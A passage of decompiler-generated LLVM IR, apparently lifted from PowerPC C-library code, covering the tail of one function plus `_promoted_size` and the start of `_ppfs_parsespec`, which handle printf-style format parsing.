  %v3_10003fd8 = load i8, i8* %v2_10003fd8, align 1
  %v4_10003fd8 = zext i8 %v3_10003fd8 to i32
  store i32 %v4_10003fd8, i32* %r0.global-to-local, align 4
  %tmp32 = urem i8 %v3_10003fd8, 2
  %v1_10003fdc = zext i8 %tmp32 to i32
  %v2_10003fe0 = icmp ugt i8 %v3_10003fd8, 6
  store i1 %v2_10003fe0, i1* %cr7_gt.global-to-local, align 1
  %v2_10003fe4 = add nuw nsw i32 %v1_10003fdc, %v4_10003fd8
  store i32 %v2_10003fe4, i32* %r9.global-to-local, align 4
  %v1_10003fe8 = trunc i32 %v2_10003fe4 to i8
  store i8 %v1_10003fe8, i8* %v2_10003fd8, align 1
  %v0_10003fec = load i1, i1* %cr7_gt.global-to-local, align 1
  %v0_1000400c = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10003fec, label %dec_label_pc_1000400c, label %dec_label_pc_10003ff0

dec_label_pc_10003ff0:                            ; preds = %dec_label_pc_10003fd8
  %v1_10003ff0 = add i32 %v0_1000400c, 8
  %v2_10003ff0 = inttoptr i32 %v1_10003ff0 to i32*
  %v3_10003ff0 = load i32, i32* %v2_10003ff0, align 4
  store i32 %v3_10003ff0, i32* %r0.global-to-local, align 4
  %v0_10003ff4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003ff4 = urem i32 %v0_10003ff4, 256
  %v1_10003ff8 = mul nuw nsw i32 %v1_10003ff4, 4
  store i32 %v1_10003ff8, i32* %r11.global-to-local, align 4
  %v1_10003ffc = add nuw nsw i32 %v1_10003ff4, 2
  store i32 %v1_10003ffc, i32* %r9.global-to-local, align 4
  %v1_10004000 = trunc i32 %v1_10003ffc to i8
  %v2_10004000 = load i32, i32* @r3, align 4
  %v3_10004000 = add i32 %v2_10004000, 76
  %v4_10004000 = inttoptr i32 %v3_10004000 to i8*
  store i8 %v1_10004000, i8* %v4_10004000, align 1
  %v0_10004004 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004004 = load i32, i32* %r0.global-to-local, align 4
  %v2_10004004 = add i32 %v1_10004004, %v0_10004004
  store i32 %v2_10004004, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004020

dec_label_pc_1000400c:                            ; preds = %dec_label_pc_10003fd8
  %v1_1000400c = add i32 %v0_1000400c, 4
  %v2_1000400c = inttoptr i32 %v1_1000400c to i32*
  %v3_1000400c = load i32, i32* %v2_1000400c, align 4
  %v1_10004010 = add i32 %v3_1000400c, 7
  store i32 %v1_10004010, i32* %r9.global-to-local, align 4
  %v1_10004014 = call i32 @__asm_rlwinm(i32 %v1_10004010, i32 0, i32 0, i32 28)
  store i32 %v1_10004014, i32* %r11.global-to-local, align 4
  %v1_10004018 = add i32 %v1_10004014, 8
  store i32 %v1_10004018, i32* %r0.global-to-local, align 4
  %v1_1000401c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000401c = add i32 %v1_1000401c, 4
  %v3_1000401c = inttoptr i32 %v2_1000401c to i32*
  store i32 %v1_10004018, i32* %v3_1000401c, align 4
  %v0_10004020.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004020

dec_label_pc_10004020:                            ; preds = %dec_label_pc_10003ff0, %dec_label_pc_1000400c
  %v0_10004020 = phi i32 [ %v2_10004004, %dec_label_pc_10003ff0 ], [ %v0_10004020.pre, %dec_label_pc_1000400c ]
  %v1_10004020 = inttoptr i32 %v0_10004020 to i32*
  %v2_10004020 = load i32, i32* %v1_10004020, align 4
  store i32 %v2_10004020, i32* %r9.global-to-local, align 4
  %v1_10004024 = add i32 %v0_10004020, 4
  %v2_10004024 = inttoptr i32 %v1_10004024 to i32*
  %v3_10004024 = load i32, i32* %v2_10004024, align 4
  store i32 %v3_10004024, i32* %r10.global-to-local, align 4
  %v1_10004028 = load i32, i32* %r8.global-to-local, align 4
  %v2_10004028 = inttoptr i32 %v1_10004028 to i32*
  store i32 %v2_10004020, i32* %v2_10004028, align 4
  %v0_1000402c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000402c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000402c = add i32 %v1_1000402c, 4
  %v3_1000402c = inttoptr i32 %v2_1000402c to i32*
  store i32 %v0_1000402c, i32* %v3_1000402c, align 4
  br label %dec_label_pc_100040b8

dec_label_pc_10004034:                            ; preds = %dec_label_pc_10003fcc, %dec_label_pc_10003fd0
  store i32 %v1_10003f9c, i32* %r10.global-to-local, align 4
  %v1_10004038 = add i32 %v2_10004098, 77
  %v2_10004038 = inttoptr i32 %v1_10004038 to i8*
  %v3_10004038 = load i8, i8* %v2_10004038, align 1
  %v4_10004038 = zext i8 %v3_10004038 to i32
  store i32 %v4_10004038, i32* %r11.global-to-local, align 4
  %v2_1000403c = icmp ugt i8 %v3_10004038, 8
  store i1 %v2_1000403c, i1* %cr7_gt.global-to-local, align 1
  %tmp29 = icmp ugt i8 %v3_10004038, 7
  br i1 %tmp29, label %dec_label_pc_10004060, label %dec_label_pc_10004044

dec_label_pc_10004044:                            ; preds = %dec_label_pc_10004034
  %v1_10004044 = add i32 %v2_10004098, 84
  %v2_10004044 = inttoptr i32 %v1_10004044 to i32*
  %v3_10004044 = load i32, i32* %v2_10004044, align 4
  store i32 %v3_10004044, i32* %r9.global-to-local, align 4
  %v1_10004048 = mul nuw nsw i32 %v4_10004038, 8
  store i32 %v1_10004048, i32* %r0.global-to-local, align 4
  %v1_1000404c = add nuw nsw i32 %v4_10004038, 1
  store i32 %v1_1000404c, i32* %r11.global-to-local, align 4
  %v1_10004050 = trunc i32 %v1_1000404c to i8
  store i8 %v1_10004050, i8* %v2_10004038, align 1
  %v0_10004054 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004054 = add i32 %v0_10004054, 32
  %v1_10004058 = load i32, i32* %r0.global-to-local, align 4
  %v2_10004058 = add i32 %v1_10004054, %v1_10004058
  store i32 %v2_10004058, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100040b8

dec_label_pc_10004060:                            ; preds = %dec_label_pc_10004034
  %v1_10004060 = add i32 %v2_10004098, 80
  %v2_10004060 = inttoptr i32 %v1_10004060 to i32*
  %v3_10004060 = load i32, i32* %v2_10004060, align 4
  %v1_10004064 = add i32 %v3_10004060, 7
  store i32 %v1_10004064, i32* %r9.global-to-local, align 4
  %v1_10004068 = call i32 @__asm_rlwinm(i32 %v1_10004064, i32 0, i32 0, i32 28)
  store i32 %v1_10004068, i32* %r9.global-to-local, align 4
  %v1_1000406c = add i32 %v1_10004068, 8
  store i32 %v1_1000406c, i32* %r0.global-to-local, align 4
  %v1_10004070 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004070 = add i32 %v1_10004070, 4
  %v3_10004070 = inttoptr i32 %v2_10004070 to i32*
  store i32 %v1_1000406c, i32* %v3_10004070, align 4
  br label %dec_label_pc_100040b8

dec_label_pc_10004080:                            ; preds = %dec_label_pc_10003fcc, %dec_label_pc_10003fd0, %dec_label_pc_10003fb8, %dec_label_pc_10003fa4
  %v2_10004080 = inttoptr i32 %v1_10003f9c to i8*
  %v3_10004080 = load i8, i8* %v2_10004080, align 1
  %v4_10004080 = zext i8 %v3_10004080 to i32
  store i32 %v4_10004080, i32* %r11.global-to-local, align 4
  %v2_10004084 = icmp ugt i8 %v3_10004080, 8
  store i1 %v2_10004084, i1* %cr7_gt.global-to-local, align 1
  %tmp30 = icmp ugt i8 %v3_10004080, 7
  br i1 %tmp30, label %dec_label_pc_100040a4, label %dec_label_pc_1000408c

dec_label_pc_1000408c:                            ; preds = %dec_label_pc_10004080
  %v1_1000408c = add i32 %v2_10004098, 84
  %v2_1000408c = inttoptr i32 %v1_1000408c to i32*
  %v3_1000408c = load i32, i32* %v2_1000408c, align 4
  store i32 %v3_1000408c, i32* %r0.global-to-local, align 4
  %v1_10004090 = mul nuw nsw i32 %v4_10004080, 4
  store i32 %v1_10004090, i32* %r9.global-to-local, align 4
  %v1_10004094 = add nuw nsw i32 %v4_10004080, 1
  store i32 %v1_10004094, i32* %r11.global-to-local, align 4
  %v1_10004098 = trunc i32 %v1_10004094 to i8
  store i8 %v1_10004098, i8* %v2_10004080, align 1
  %v0_1000409c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000409c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000409c = add i32 %v1_1000409c, %v0_1000409c
  store i32 %v2_1000409c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100040b0

dec_label_pc_100040a4:                            ; preds = %dec_label_pc_10004080
  %v1_100040a4 = add i32 %v2_10004098, 80
  %v2_100040a4 = inttoptr i32 %v1_100040a4 to i32*
  %v3_100040a4 = load i32, i32* %v2_100040a4, align 4
  store i32 %v3_100040a4, i32* %r9.global-to-local, align 4
  %v1_100040a8 = add i32 %v3_100040a4, 4
  store i32 %v1_100040a8, i32* %r0.global-to-local, align 4
  store i32 %v1_100040a8, i32* %v2_100040a4, align 4
  %v0_100040b0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100040b0

dec_label_pc_100040b0:                            ; preds = %dec_label_pc_1000408c, %dec_label_pc_100040a4
  %v0_100040b0 = phi i32 [ %v2_1000409c, %dec_label_pc_1000408c ], [ %v0_100040b0.pre, %dec_label_pc_100040a4 ]
  %v1_100040b0 = inttoptr i32 %v0_100040b0 to i32*
  %v2_100040b0 = load i32, i32* %v1_100040b0, align 4
  store i32 %v2_100040b0, i32* %r0.global-to-local, align 4
  %v1_100040b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100040b4 = inttoptr i32 %v1_100040b4 to i32*
  store i32 %v2_100040b0, i32* %v2_100040b4, align 4
  br label %dec_label_pc_100040b8

dec_label_pc_100040b8:                            ; preds = %dec_label_pc_10004060, %dec_label_pc_10004044, %dec_label_pc_10004020, %dec_label_pc_100040b0
  %v0_100040b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100040b8 = add i32 %v0_100040b8, 8
  store i32 %v1_100040b8, i32* %r8.global-to-local, align 4
  %v0_100040bc.pre = load i32, i32* @r7, align 4
  %v0_100040c0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100040bc

dec_label_pc_100040bc:                            ; preds = %dec_label_pc_10003f88, %dec_label_pc_100040b8
  %v0_100040c0 = phi i32 [ %v2_10004098, %dec_label_pc_10003f88 ], [ %v0_100040c0.pre, %dec_label_pc_100040b8 ]
  %v0_100040bc = phi i32 [ %v0_10003f88, %dec_label_pc_10003f88 ], [ %v0_100040bc.pre, %dec_label_pc_100040b8 ]
  %v1_100040bc = add i32 %v0_100040bc, 1
  store i32 %v1_100040bc, i32* @r7, align 4
  %v1_100040c0 = add i32 %v0_100040c0, 28
  %v2_100040c0 = inttoptr i32 %v1_100040c0 to i32*
  %v3_100040c0 = load i32, i32* %v2_100040c0, align 4
  store i32 %v3_100040c0, i32* %r0.global-to-local, align 4
  %v2_100040c4 = icmp slt i32 %v1_100040bc, %v3_100040c0
  %v3_100040c4 = icmp sgt i32 %v1_100040bc, %v3_100040c0
  store i1 %v3_100040c4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100040c4, label %dec_label_pc_10003f88, label %dec_label_pc_10004110

dec_label_pc_100040d0:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_100040d4 = icmp ne i32 %v3_10003ed8, -2147483648
  %v4_100040d4 = icmp eq i32 %v3_10003ed8, -2147483648
  store i1 %v3_100040d4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_100040d4, label %dec_label_pc_100040dc, label %dec_label_pc_100040f0

dec_label_pc_100040dc:                            ; preds = %dec_label_pc_100040d0
  %v1_100040dc = add i32 %v0_10003ed0, 36
  %v2_100040dc = inttoptr i32 %v1_100040dc to i8*
  %v3_100040dc = load i8, i8* %v2_100040dc, align 1
  %v4_100040dc = zext i8 %v3_100040dc to i32
  %v1_100040e0 = mul nuw nsw i32 %v4_100040dc, 8
  %v2_100040e4 = add i32 %v1_100040e0, %v1_10003ed4
  store i32 %v2_100040e4, i32* %r9.global-to-local, align 4
  %v1_100040e8 = add i32 %v2_100040e4, -8
  %v2_100040e8 = inttoptr i32 %v1_100040e8 to i32*
  %v3_100040e8 = load i32, i32* %v2_100040e8, align 4
  store i32 %v3_100040e8, i32* %r0.global-to-local, align 4
  store i32 %v3_100040e8, i32* %v2_10003ed8, align 4
  %v0_100040f0.pre = load i32, i32* @r3, align 4
  %v1_100040f4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100040f0

dec_label_pc_100040f0:                            ; preds = %dec_label_pc_100040d0, %dec_label_pc_100040dc
  %v1_100040f4 = phi i32 [ -2147483648, %dec_label_pc_100040d0 ], [ %v1_100040f4.pre, %dec_label_pc_100040dc ]
  %v1_1000410c = phi i32 [ %v0_10003ed0, %dec_label_pc_100040d0 ], [ %v0_100040f0.pre, %dec_label_pc_100040dc ]
  %v1_100040f0 = add i32 %v1_1000410c, 4
  %v2_100040f0 = inttoptr i32 %v1_100040f0 to i32*
  %v3_100040f0 = load i32, i32* %v2_100040f0, align 4
  store i32 %v3_100040f0, i32* %r0.global-to-local, align 4
  %v3_100040f4 = icmp sgt i32 %v3_100040f0, %v1_100040f4
  %v4_100040f4 = icmp eq i32 %v3_100040f0, %v1_100040f4
  store i1 %v3_100040f4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_100040f4, label %dec_label_pc_100040fc, label %dec_label_pc_10004110

dec_label_pc_100040fc:                            ; preds = %dec_label_pc_100040f0
  %v1_100040fc = add i32 %v1_1000410c, 37
  %v2_100040fc = inttoptr i32 %v1_100040fc to i8*
  %v3_100040fc = load i8, i8* %v2_100040fc, align 1
  %v4_100040fc = zext i8 %v3_100040fc to i32
  %v1_10004100 = mul nuw nsw i32 %v4_100040fc, 8
  %v1_10004104 = load i32, i32* %r8.global-to-local, align 4
  %v2_10004104 = add i32 %v1_10004100, %v1_10004104
  store i32 %v2_10004104, i32* %r9.global-to-local, align 4
  %v1_10004108 = add i32 %v2_10004104, -8
  %v2_10004108 = inttoptr i32 %v1_10004108 to i32*
  %v3_10004108 = load i32, i32* %v2_10004108, align 4
  store i32 %v3_10004108, i32* %r0.global-to-local, align 4
  store i32 %v3_10004108, i32* %v2_100040f0, align 4
  %v0_10004110.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10004110

dec_label_pc_10004110:                            ; preds = %dec_label_pc_100040bc, %dec_label_pc_100040c0.preheader, %dec_label_pc_100040f0, %dec_label_pc_100040fc
  %v0_10004110 = phi i32 [ %v1_1000410c, %dec_label_pc_100040f0 ], [ %v0_10004110.pre, %dec_label_pc_100040fc ], [ %v0_100040c05, %dec_label_pc_100040c0.preheader ], [ %v0_100040c0, %dec_label_pc_100040bc ]
  %v1_10004110 = add i32 %v0_10004110, 8
  %v2_10004110 = inttoptr i32 %v1_10004110 to i32*
  %v3_10004110 = load i32, i32* %v2_10004110, align 4
  store i32 %v3_10004110, i32* %r11.global-to-local, align 4
  %v2_10004114 = icmp sgt i32 %v3_10004110, 0
  store i1 %v2_10004114, i1* %cr7_gt.global-to-local, align 1
  %v0_10004118 = load i32, i32* @lr, align 4
  %tmp31 = icmp sgt i32 %v3_10004110, -1
  call void @__pseudo_cond_branch(i1 %tmp31, i32 %v0_10004118)
  %v0_1000411c = load i32, i32* @r3, align 4
  %v1_1000411c = add i32 %v0_1000411c, 16
  %v2_1000411c = inttoptr i32 %v1_1000411c to i32*
  %v3_1000411c = load i32, i32* %v2_1000411c, align 4
  store i32 %v3_1000411c, i32* %r0.global-to-local, align 4
  %v0_10004120 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004120 = sub i32 0, %v0_10004120
  store i32 %v1_10004120, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_10004128 = add i32 %v0_1000411c, 8
  %v3_10004128 = inttoptr i32 %v2_10004128 to i32*
  store i32 %v1_10004120, i32* %v3_10004128, align 4
  %v0_1000412c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000412c = load i32, i32* @r3, align 4
  %v2_1000412c = add i32 %v1_1000412c, 20
  %v3_1000412c = inttoptr i32 %v2_1000412c to i32*
  store i32 %v0_1000412c, i32* %v3_1000412c, align 4
  %v0_10004130 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004130 = or i32 %v0_10004130, 8
  store i32 %v1_10004130, i32* %r0.global-to-local, align 4
  %v1_10004134 = call i32 @__asm_rlwinm(i32 %v1_10004130, i32 0, i32 0, i32 30)
  store i32 %v1_10004134, i32* %r0.global-to-local, align 4
  %v1_10004138 = load i32, i32* @r3, align 4
  %v2_10004138 = add i32 %v1_10004138, 16
  %v3_10004138 = inttoptr i32 %v2_10004138 to i32*
  store i32 %v1_10004134, i32* %v3_10004138, align 4
  %v0_1000413c = load i32, i32* @r3, align 4
  ret i32 %v0_1000413c

; uselistorder directives
  uselistorder i32 %v3_100040f0, { 1, 0, 2 }
  uselistorder i32 %v1_100040f4, { 1, 0 }
  uselistorder i32 %v3_100040c0, { 1, 0, 2 }
  uselistorder i32 %v1_100040bc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_100040c0, { 0, 2, 1 }
  uselistorder i32 %v4_10004080, { 1, 0, 2 }
  uselistorder i32 %v4_10004038, { 1, 0, 2 }
  uselistorder i32 %v0_10004020, { 1, 0 }
  uselistorder i32 %v1_10003ff4, { 1, 0 }
  uselistorder i32 %v0_1000400c, { 1, 0 }
  uselistorder i8 %v3_10003fd8, { 1, 0, 2 }
  uselistorder i32 %v1_10003f9c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10003f90, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_10003f88, { 1, 0 }
  uselistorder i32 %v2_10004098, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_100040c05, { 1, 0, 2 }
  uselistorder i32 %v4_10003f40, { 1, 0, 2 }
  uselistorder i32 %v3_10003f30, { 1, 0, 2 }
  uselistorder i32 %v2_10003f5c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v4_10003ef0, { 1, 0, 2 }
  uselistorder i32 %v3_10003ed8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_10003ed0, { 1, 0, 2 }
  uselistorder i32 %v0_10003ed0, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 19, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 33, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 0, 19, 8, 9, 10, 11, 18, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_10004110, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100040f0, { 1, 0 }
  uselistorder label %dec_label_pc_100040bc, { 1, 0 }
  uselistorder label %dec_label_pc_100040b8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100040b0, { 1, 0 }
  uselistorder label %dec_label_pc_10004080, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10004034, { 1, 0 }
  uselistorder label %dec_label_pc_10004020, { 1, 0 }
  uselistorder label %dec_label_pc_10003f88, { 1, 0 }
  uselistorder label %dec_label_pc_100040c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003f74, { 1, 0 }
  uselistorder label %dec_label_pc_10003f30, { 1, 0 }
  uselistorder label %dec_label_pc_10003f24, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000414c

dec_label_pc_1000414c:                            ; preds = %dec_label_pc_1000414c, %entry
  %v0_1000414c = phi i32 [ ptrtoint (i32* @global_var_1000bd68.363 to i32), %entry ], [ %v1_1000414c, %dec_label_pc_1000414c ]
  %v1_1000414c = add i32 %v0_1000414c, -2
  %v2_1000414c = inttoptr i32 %v1_1000414c to i16*
  %v3_1000414c = load i16, i16* %v2_1000414c, align 2
  %v4_1000414c = sext i16 %v3_1000414c to i32
  %v4_10004150 = icmp eq i32 %v4_1000414c, %arg1
  %v3_10004154.not = icmp ule i32 %v1_1000414c, ptrtoint (i32* @global_var_1000bd50.364 to i32)
  %brmerge = or i1 %v4_10004150, %v3_10004154.not
  br i1 %brmerge, label %dec_label_pc_10004160, label %dec_label_pc_1000414c

dec_label_pc_10004160:                            ; preds = %dec_label_pc_1000414c
  %v2_10004168 = sub i32 %v1_1000414c, ptrtoint (i32* @global_var_1000bd50.364 to i32)
  %v1_10004170 = udiv i32 %v2_10004168, 2
  %v2_10004170 = and i32 %v2_10004168, -2147483648
  %v3_10004170 = or i32 %v1_10004170, %v2_10004170
  %v2_10004178 = add i32 %v3_10004170, ptrtoint (i32* @global_var_1000bd68.363 to i32)
  %v3_10004178 = inttoptr i32 %v2_10004178 to i8*
  %v4_10004178 = load i8, i8* %v3_10004178, align 1
  %v5_10004178 = zext i8 %v4_10004178 to i32
  ret i32 %v5_10004178

; uselistorder directives
  uselistorder i32 %v2_10004168, { 1, 0 }
  uselistorder i32 %v1_1000414c, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1000bd50.364 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000bd68.363 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_10004184 = load i32, i32* @lr, align 4
  store i32 %v0_10004184, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 8, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000419c = add i32 %tmp, 16
  %v2_1000419c = inttoptr i32 %v1_1000419c to i32*
  %v3_1000419c = load i32, i32* %v2_1000419c, align 4
  store i32 %v3_1000419c, i32* %r0.global-to-local, align 4
  %v1_100041ac = and i32 %v3_1000419c, 128
  store i32 %v1_100041ac, i32* %r5.global-to-local, align 4
  %v3_100041ac = icmp eq i32 %v1_100041ac, 0
  store i32 8, i32* %stack_var_-104, align 4
  %v1_100041b4 = add i32 %tmp, 24
  %v2_100041b4 = inttoptr i32 %v1_100041b4 to i32*
  %v3_100041b4 = load i32, i32* %v2_100041b4, align 4
  store i32 %v3_100041b4, i32* @r26, align 4
  br i1 %v3_100041ac, label %dec_label_pc_100041bc, label %dec_label_pc_100041d4

dec_label_pc_100041bc:                            ; preds = %entry
  %v2_100041bc = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_10004228

dec_label_pc_100041cc:                            ; preds = %dec_label_pc_100043fc
  %v1_100041cc = add i32 %v0_100043cc, 1
  store i32 %v1_100041cc, i32* @r30, align 4
  br label %dec_label_pc_10004414

dec_label_pc_100041d4:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_100041d8 = load i32, i32* %arg1, align 4
  store i32 %v2_100041d8, i32* @r7, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_100041e4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100041e4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100041e8

dec_label_pc_100041e8:                            ; preds = %dec_label_pc_10004218.dec_label_pc_100041e8_crit_edge, %dec_label_pc_100041d4
  %v0_100041f0 = phi i32 [ %v0_100041f0.pre, %dec_label_pc_10004218.dec_label_pc_100041e8_crit_edge ], [ %v2_100041d8, %dec_label_pc_100041d4 ]
  %v0_100041ec = phi i32 [ %v0_100041ec.pre, %dec_label_pc_10004218.dec_label_pc_100041e8_crit_edge ], [ %v2_100041e4, %dec_label_pc_100041d4 ]
  %v0_100041f4 = phi i32 [ %v0_100041e8.pre, %dec_label_pc_10004218.dec_label_pc_100041e8_crit_edge ], [ 0, %dec_label_pc_100041d4 ]
  %v1_100041e8 = mul i32 %v0_100041f4, 4
  %v2_100041ec = add i32 %v0_100041f4, %v0_100041ec
  store i32 %v2_100041ec, i32* %r10.global-to-local, align 4
  %v2_100041f0 = add i32 %v1_100041e8, %v0_100041f0
  store i32 %v2_100041f0, i32* %r11.global-to-local, align 4
  %v1_100041f4 = add i32 %v0_100041f4, 1
  store i32 %v1_100041f4, i32* %r8.global-to-local, align 4
  %v1_100041f8 = add i32 %v2_100041f0, -4
  %v2_100041f8 = inttoptr i32 %v1_100041f8 to i32*
  %v3_100041f8 = load i32, i32* %v2_100041f8, align 4
  store i32 %v3_100041f8, i32* %r9.global-to-local, align 4
  %v1_100041fc = trunc i32 %v3_100041f8 to i8
  %v3_100041fc = add i32 %v2_100041ec, 24
  %v4_100041fc = inttoptr i32 %v3_100041fc to i8*
  store i8 %v1_100041fc, i8* %v4_100041fc, align 1
  %v0_10004200 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004200 = urem i32 %v0_10004200, 256
  store i32 %v1_10004200, i32* %r9.global-to-local, align 4
  %v0_10004208 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004208 = add i32 %v0_10004208, -4
  %v2_10004208 = inttoptr i32 %v1_10004208 to i32*
  %v3_10004208 = load i32, i32* %v2_10004208, align 4
  store i32 %v3_10004208, i32* %r0.global-to-local, align 4
  %v4_1000420c = icmp eq i32 %v1_10004200, %v3_10004208
  br i1 %v4_1000420c, label %dec_label_pc_10004214, label %dec_label_pc_10004684

dec_label_pc_10004214:                            ; preds = %dec_label_pc_100041e8
  %v3_10004204 = icmp eq i32 %v1_10004200, 0
  br i1 %v3_10004204, label %dec_label_pc_1000421c, label %dec_label_pc_10004218

dec_label_pc_10004218:                            ; preds = %dec_label_pc_10004214
  %v0_10004218 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004218 = add i32 %v0_10004218, -1
  store i32 %v1_10004218, i32* %ctr.global-to-local, align 4
  %v2_10004218 = icmp eq i32 %v1_10004218, 0
  br i1 %v2_10004218, label %dec_label_pc_1000421c, label %dec_label_pc_10004218.dec_label_pc_100041e8_crit_edge

dec_label_pc_10004218.dec_label_pc_100041e8_crit_edge: ; preds = %dec_label_pc_10004218
  %v0_100041e8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_100041ec.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_100041f0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_100041e8

dec_label_pc_1000421c:                            ; preds = %dec_label_pc_10004218, %dec_label_pc_10004214
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10004220 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_10004228

dec_label_pc_10004228:                            ; preds = %dec_label_pc_100041bc, %dec_label_pc_1000421c
  %v2_10004238.pre-phi = phi i32 [ %.pre, %dec_label_pc_100041bc ], [ %v2_100041e4, %dec_label_pc_1000421c ]
  %storemerge3 = phi i32 [ %v2_100041bc, %dec_label_pc_100041bc ], [ %v2_10004220, %dec_label_pc_1000421c ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r27, align 4
  store i32 268500992, i32* @r25, align 4
  store i32 %v2_10004238.pre-phi, i32* @r29, align 4
  store i32 268566528, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004248

dec_label_pc_10004244:                            ; preds = %dec_label_pc_10004354, %dec_label_pc_100043d8
  %v0_10004244 = phi i32 [ %v1_100043d8, %dec_label_pc_100043d8 ], [ %v0_1000433c, %dec_label_pc_10004354 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_100043d8 ], [ %stack_var_-84.2, %dec_label_pc_10004354 ]
  store i32 %v0_10004244, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10004248

dec_label_pc_10004248:                            ; preds = %dec_label_pc_10004228, %dec_label_pc_10004244
  %v0_1000425c = phi i32 [ %storemerge3, %dec_label_pc_10004228 ], [ %v0_10004244, %dec_label_pc_10004244 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_10004228 ], [ %stack_var_-84.0, %dec_label_pc_10004244 ]
  %v1_10004248 = inttoptr i32 %v0_1000425c to i8*
  %v2_10004248 = load i8, i8* %v1_10004248, align 1
  %v3_10004248 = zext i8 %v2_10004248 to i32
  store i32 %v3_10004248, i32* %r0.global-to-local, align 4
  store i32 %v0_1000425c, i32* @r30, align 4
  %v3_10004250 = icmp eq i8 %v2_10004248, 42
  br i1 %v3_10004250, label %dec_label_pc_10004258, label %dec_label_pc_10004268

dec_label_pc_10004258:                            ; preds = %dec_label_pc_10004248
